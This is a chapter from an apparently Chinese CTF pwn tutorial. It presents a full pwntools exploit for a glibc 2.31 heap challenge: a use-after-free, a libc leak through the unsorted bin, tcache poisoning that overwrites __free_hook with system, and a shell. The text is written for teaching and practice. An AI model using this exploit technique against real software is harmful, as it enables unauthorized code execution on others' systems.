# 第 35 章 真题实战（二）：堆

> 最后一道综合题，我们用 tcache poisoning 完成一次经典的堆利用。

---

## 35.1 题目描述

一个菜单式堆管理器，glibc 2.31，功能：

- `add(idx, size, data)`：分配 chunk
- `delete(idx)`：释放 chunk（UAF：指针不清零）
- `edit(idx, data)`：修改 chunk 内容
- `show(idx)`：打印 chunk 内容

目标：getshell。

---

## 35.2 完整 exp

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./heap_chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = process(elf.path)

def add(idx, size, data):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

def show(idx):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())

# ====== 第一步：泄露 libc ======
add(0, 0x500, b'A' * 8)      # 大块进 unsorted bin
add(1, 0x20, b'guard')       # 防止合并
delete(0)
show(0)
leak = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
libc.address = leak - 0x1ebbe0   # main_arena+96 偏移
log.success(f'libc: {hex(libc.address)}')

# ====== 第二步：tcache poisoning ======
free_hook = libc.sym['__free_hook']
system = libc.sym['system']

add(2, 0x30, b'B' * 8)
delete(2)
edit(2, p64(free_hook))      # 修改 fd

add(3, 0x30, b'C' * 8)
add(4, 0x30, p64(system))    # 写入 __free_hook

# ====== 第三步：getshell ======
add(5, 0x30, b'/bin/sh\x00')
delete(5)
p.interactive()
```

---

## 35.3 关键点回顾

1. **unsorted bin leak**：大块 free 后 fd/bk 指向 main_arena，泄露 libc
2. **tcache poisoning**：修改已释放 chunk 的 fd，让 malloc 返回任意地址
3. **hook 劫持**：把 `__free_hook` 改成 system，free("/bin/sh") 触发 getshell
4. **版本注意**：如果是 glibc 2.35，需要改用 IO_FILE 利用
